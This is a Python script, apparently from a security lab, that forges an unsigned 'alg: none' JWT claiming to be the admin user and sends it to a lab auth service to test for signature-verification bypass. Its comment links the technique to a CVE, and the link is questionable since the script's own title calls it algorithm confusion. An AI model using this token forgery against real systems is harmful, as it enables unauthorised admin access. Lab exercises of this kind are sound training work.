#!/usr/bin/env python3
import base64
import json
import sys
from pathlib import Path
import requests

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))
from linux_run.lab_env import load_lab_env

LAB_ENV = load_lab_env(REPO_ROOT)

print("=========================================")
print("Scenario 4 - JWT Algorithm Confusion")
print("=========================================")

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Forge an unsigned ("alg": "none") token — this is the actual CVE-2022-29217
# exploit: PyJWT 1.7.1's decode() with no `algorithms` restriction will accept
# alg="none" and skip signature verification entirely.
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "user_id": 1}
forged_token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."

try:
    response = requests.post(
        f"{LAB_ENV['AUTHSERVICE_URL']}/auth/verify",
        json={"token": forged_token},
        timeout=5
    )
    print("Status:", response.status_code)
    print("Body:", response.text)
except Exception as e:
    print(e)

print("\n[✓] JWT verification request sent.")
